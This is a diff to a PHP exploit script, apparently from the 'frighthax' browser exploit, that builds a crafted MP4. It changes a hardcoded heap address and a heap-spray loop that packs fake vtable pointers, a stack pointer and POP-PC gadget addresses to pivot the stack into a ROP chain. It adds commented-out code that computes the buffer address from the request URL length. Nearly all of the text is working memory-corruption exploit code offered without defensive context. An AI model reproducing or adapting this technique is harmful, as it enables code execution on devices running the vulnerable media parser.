@@ -17,7 +17,11 @@ if(($browserver & 0x80) == 0)
 
 $con = file_get_contents("frighthax_header.mp4");
 
-$heapaddr_stscarraydata_off_x1200 = 0x39533680;//Offset 0x1201 relative to the stsc entries data start, in the buffer containing the *entire* raw mp4.
+//url_len = strlen("http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']);//The address of the below mp4 buffer varies depending on the length of the requested URL.
+//$heapaddr_stscarraydata_off_x1200 = 0x39531c88+0x577+0x1201 + (($url_len - 37) * 0x2);
+//$heapaddr_stscarraydata_off_x1200 = ($heapaddr_stscarraydata_off_x1200 + 0x3) & ~0x3;
+
+$heapaddr_stscarraydata_off_x1200 = 0x39533680;//Offset 0x1201 relative to the stsc entries data start, in the buffer containing the *entire* raw mp4. This hax will work fine as long as this address lands at <stsc entries data start>+0x201 .. <stsc entries data start>+0x21f1, and is 0x10-byte aligned relative to <stsc entries data start>+0x201.
 $fake_vtableptr = $heapaddr_stscarraydata_off_x1200+0x2000;
 $stackptr = $fake_vtableptr+0x2000;
 
@@ -40,10 +44,10 @@ for($i=0; $i<0x200; $i+=4)//Setup the data which will get copied to the output b
 
 $con.= pack("C*", 0x0);//Align the offset after this, and as a result the address, to 4-bytes.
 
-for($i=0; $i<(0x2000/0x40); $i++)//Setup the data which will be used at offset 0x1200 relative to the stsc entries data start, in the buffer containing the *entire* raw mp4. This is where the object data for the above objectptr is located.
+for($i=0; $i<(0x2000/0x10); $i++)//Setup the data which will be used at offset 0x1200 relative to the stsc entries data start, in the buffer containing the *entire* raw mp4. This is where the object data for the above objectptr is located.
 {
-	$con.= pack("V*", $fake_vtableptr);//fake vtable ptr / r0 for stack-pivot.
-	for($pos=0x4; $pos<0x34; $pos+=4)$con.= pack("V*", $fake_vtableptr);//Setup r1..ip for the stack-pivot.
+	$con.= pack("V*", $fake_vtableptr);//Fake vtable ptr, the 0x34-bytes starting here is also popped into r0..ip during stack-pivot.
+	//for($pos=0x4; $pos<0x34; $pos+=4)$con.= pack("V*", $fake_vtableptr);//Setup r1..ip for the stack-pivot.
 	$con.= pack("V*", $stackptr);//Setup sp for the stack-pivot.
 	$con.= pack("V*", $POPPC);//Setup lr for the stack-pivot.
 	$con.= pack("V*", $POPPC);//Setup pc for the stack-pivot.
